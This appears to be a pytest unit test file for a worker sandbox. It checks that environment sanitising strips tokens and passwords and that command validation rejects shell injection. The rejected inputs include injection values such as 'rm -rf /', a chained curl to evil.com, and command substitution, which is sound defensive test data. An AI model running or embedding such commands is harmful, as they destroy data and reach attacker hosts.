"""Unit tests for worker sandbox boundaries and shell injection prevention."""

import pytest

from orchestrator.core.sandbox import (
    ShellInjectionError,
    sanitize_worker_environment,
    validate_command_argv,
)


def test_sanitize_worker_environment_strips_secrets():
    dirty_env = {
        "PATH": "/usr/bin",
        "GITHUB_TOKEN": "ghp_secret12345",
        "GH_TOKEN": "gho_secret67890",
        "AWS_SECRET_ACCESS_KEY": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
        "SSH_AUTH_SOCK": "/tmp/ssh.sock",
        "DOCKER_HOST": "unix:///var/run/docker.sock",
        "DB_PASSWORD": "supersecretpassword",
        "MY_API_KEY": "abcdef123456",
        "PYTHONPATH": "src/",
        "UNKNOWN_CUSTOM_VAR": "should_be_stripped",
    }
    cleaned = sanitize_worker_environment(dirty_env)

    # Secrets stripped
    assert "GITHUB_TOKEN" not in cleaned
    assert "GH_TOKEN" not in cleaned
    assert "AWS_SECRET_ACCESS_KEY" not in cleaned
    assert "SSH_AUTH_SOCK" not in cleaned
    assert "DOCKER_HOST" not in cleaned
    assert "DB_PASSWORD" not in cleaned
    assert "MY_API_KEY" not in cleaned

    # Non-allowlisted custom variable stripped
    assert "UNKNOWN_CUSTOM_VAR" not in cleaned

    # Safe vars preserved
    assert cleaned["PATH"] == "/usr/bin"
    assert cleaned["PYTHONPATH"] == "src/"
    assert cleaned["FACTORY_WORKER_ISOLATED"] == "true"


def test_validate_command_argv_detects_shell_injections():
    # Valid typed commands
    validate_command_argv(["pytest", "-v", "tests/unit/test_schema.py"])
    validate_command_argv(["git", "status", "--porcelain"])

    # Injection attempts
    bad_commands = [
        ["pytest", "test.py; rm -rf /"],
        ["python", "-c", "print('hello') && curl http://evil.com"],
        ["cat", "file | grep secret"],
        ["echo", "`id`"],
        ["echo", "$(whoami)"],
        ["cat", "input > output"],
        ["cat", "input < secret.txt"],
    ]
    for bad_argv in bad_commands:
        with pytest.raises(ShellInjectionError, match="Dangerous shell metacharacter detected"):
            validate_command_argv(bad_argv)
